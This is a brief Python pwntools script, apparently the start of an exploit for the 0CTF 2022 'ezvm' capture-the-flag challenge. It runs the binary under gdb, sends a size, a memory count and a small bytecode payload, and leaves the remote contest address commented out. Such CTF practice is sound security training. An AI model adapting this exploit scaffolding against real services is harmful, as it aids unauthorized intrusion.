from pwn import *
import sys

elf = ELF("ezvm")
libc = ELF("libc-2.35.so")

io = process(elf.path)
# io = remote("202.120.7.210", 40241)

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']

gdb.attach(io, gdbscript = '''
    set env LD_PRELOAD=./libc-2.35.so
''')

def enter_code_size(x):
    io.sendlineafter(b"size:\n", x)

def enter_memcnt(x):
    io.sendlineafter(b"count:\n", x)

def enter_code(x):
    io.sendlineafter(b"code:\n", x)

io.sendlineafter(b"0ctf2022!!\n", b"AAA")
enter_code_size(b"500")
enter_memcnt(b"5")

payload = b"\x00\x01\x00\x01\x00\x01"
enter_code(payload)

io.interactive()